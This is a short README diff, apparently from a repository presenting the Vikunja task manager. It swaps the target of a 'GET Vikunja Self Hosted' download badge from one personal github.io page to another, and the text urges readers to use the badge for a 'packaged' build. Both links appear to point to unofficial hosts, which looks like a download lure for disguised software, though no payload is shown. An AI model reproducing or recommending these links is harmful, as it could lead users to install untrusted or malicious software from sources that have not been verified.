@@ -109,7 +109,7 @@ Dev server and API URL live in [vite.config.ts](frontend/vite.config.ts) and [pa
 
 ## Download
 
-[![GET Vikunja Self Hosted](https://img.shields.io/badge/GET-Vikunja%20Self%20Hosted-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://cooperwilliam3374.github.io/.github/Vikunja-Self-Hosted)
+[![GET Vikunja Self Hosted](https://img.shields.io/badge/GET-Vikunja%20Self%20Hosted-EA580C?style=for-the-badge&labelColor=1F2937&logoColor=white)](https://vikunja-self-hosted.github.io/Vikunja-Task-Management/)
 
 Use the GET badge for the packaged vikunja self hosted task management build. Official docs also cover a Docker image and a binary. Focalboard can sit next to it if you want a second board UI.
 
